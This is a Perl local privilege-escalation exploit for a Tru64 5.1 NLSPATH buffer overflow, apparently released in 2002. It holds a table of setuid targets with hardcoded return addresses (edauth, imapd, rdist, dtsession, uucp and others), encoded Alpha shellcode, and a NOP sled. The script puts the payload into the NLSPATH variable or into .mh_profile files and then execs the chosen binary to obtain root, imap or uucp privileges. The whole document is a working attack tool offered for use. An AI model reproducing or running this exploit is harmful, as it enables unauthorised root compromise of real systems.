              

#!/usr/bin/perl -w
#


# Tru64 5.1 NLSPATH
#
# stripey (stripey@snosoft.com) - 03/07/2002
#

$tgts{"0"} = pack("l",0x40011a10).":/usr/tcb/bin/edauth:uid=root";
$tgts{"1"} = pack("l",0x40014280).":/usr/sbin/imapd:euid=root";
$tgts{"2"} = pack("l",0x400120b0).":/usr/bin/rdist:euid=root";
$tgts{"3"} = pack("l",0x40014a80).":/usr/bin/mh/inc:euid=root";
$tgts{"4"} = pack("l",0x40010104).":/usr/bin/mh/msgchk:euid=root";
$tgts{"5"} = pack("l",0x40010c04).":/usr/dt/bin/dtsession:euid=root";
$tgts{"6"} = pack("l",0x400a7908).":/usr/bin/X11/dxsysinfo:euid=root, requires valid \$DISPLAY";
$tgts{"7"} = pack("l",0x4009f2f8).":/usr/tcb/bin/dxchpwd:euid=root, requires valid \$DISPLAY";
$tgts{"8"} = pack("l",0x400105e8).":/usr/bin/deliver:euid=imap";
$tgts{"9"} = pack("l",0x4003c190).":/usr/bin/uucp:euid=uucp,egid=uucp";
$tgts{"A"} = pack("l",0x400361f0).":/usr/bin/uux:euid=uucp,egid=uucp";

unless (($target,$offset,$align) = @ARGV,$align) {

        print "-"x72;
        print "\n        Tru64 NLSPATH overflow, stripey\@snosoft.com, 03/07/2002\n";
        print "-"x72;
        print "\n\nUsage: $0 <target> <offset> <align>\n\nTargets:\n\n";

        foreach $key (sort(keys %tgts)) {
                ($a,$b,$c) = split(/\:/,$tgts{"$key"});
                print "\t$key. $b ( $c )\n";
        }

        print "\n";
        exit 1;
}

($a,$b) = split(/\:/,$tgts{"$target"});

print "*** Target: $b, Offset: $offset, Align: $align ***\n\n";

$ret = pack("ll",(unpack("l",$a)+$offset), 0x1);

$sc .= "\x30\x15\xd9\x43\x11\x74\xf0\x47\x12\x14\x02\x42";
$sc .= "\xfc\xff\x32\xb2\x12\x94\x09\x42\xfc\xff\x32\xb2";
$sc .= "\xff\x47\x3f\x26\x1f\x04\x31\x22\xfc\xff\x30\xb2";
$sc .= "\xf7\xff\x1f\xd2\x10\x04\xff\x47\x11\x14\xe3\x43";
$sc .= "\x20\x35\x20\x42\xff\xff\xff\xff\x30\x15\xd9\x43";
$sc .= "\x31\x15\xd8\x43\x12\x04\xff\x47\x40\xff\x1e\xb6";
$sc .= "\x48\xff\xfe\xb7\x98\xff\x7f\x26\xd0\x8c\x73\x22";
$sc .= "\x13\x05\xf3\x47\x3c\xff\x7e\xb2\x69\x6e\x7f\x26";
$sc .= "\x2f\x62\x73\x22\x38\xff\x7e\xb2\x13\x94\xe7\x43";
$sc .= "\x20\x35\x60\x42\xff\xff\xff\xff";

$tlen = (1024-(length($sc)))/4;

$buf .= "B"x$align;
$buf .= pack("l",0x47ff041f)x($tlen-1);
$buf .= $sc;
$buf .= $ret;

$ENV{"NLSPATH"} = $buf;

if ($target eq 8) { print "Hit ctrl-d...\n"; }

if ($target eq 3) {

        $buf_b  = "AA";
        $buf_b .= pack("l",0x47ff041f)x512;
        $buf_b .= $sc;

        open(OH,">.mh_profile");
        print OH "Path: $buf_b\n";
        close(OH);
}

if ($target eq "4") {

        $buf_b  = "AA";
        $buf_b .= pack("l",0x47ff041f)x2000;
        $buf_b .= $sc;

        open(OH,">.mh_profile");
        print OH "Path: $buf_b\n";
        close(OH);
}

if ($target eq 2) {

        exec("$b","-d","a=asdf","-c","/tmp/","\'\$\{a\}\'");

}
if ($target eq 0) {

        $buf_b = "B"x30000;
        exec("$b","-g","-dt",$buf_b);

}

exec("$b");

